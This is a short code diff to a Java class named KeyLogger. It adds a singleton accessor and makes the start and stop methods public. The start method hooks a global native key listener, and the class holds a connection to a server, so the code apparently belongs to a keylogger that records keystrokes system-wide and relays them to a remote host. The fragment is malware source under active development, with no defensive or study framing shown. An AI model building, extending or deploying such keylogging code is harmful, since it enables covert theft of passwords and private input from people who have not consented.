@@ -11,12 +11,21 @@ public class KeyLogger implements NativeKeyListener {
 
     boolean isRunning = false;
     Connection server;
+    static KeyLogger instance;
+
+    public static KeyLogger getInstance(Connection c) {
+        if(instance == null) {
+            instance = new KeyLogger(c);
+        }
+        return instance;
+    }
 
     public KeyLogger(Connection c) {
         this.server = c;
+        instance = this;
     }
 
-    void start() {
+    public void start() {
         if(!isRunning) {
             try {
                 GlobalScreen.addNativeKeyListener(new KeyLogger(server));
@@ -29,7 +38,7 @@ public class KeyLogger implements NativeKeyListener {
         }
     }
 
-    void stop() {
+    public void stop() {
         if(isRunning) {
             try {
                 GlobalScreen.unregisterNativeHook();
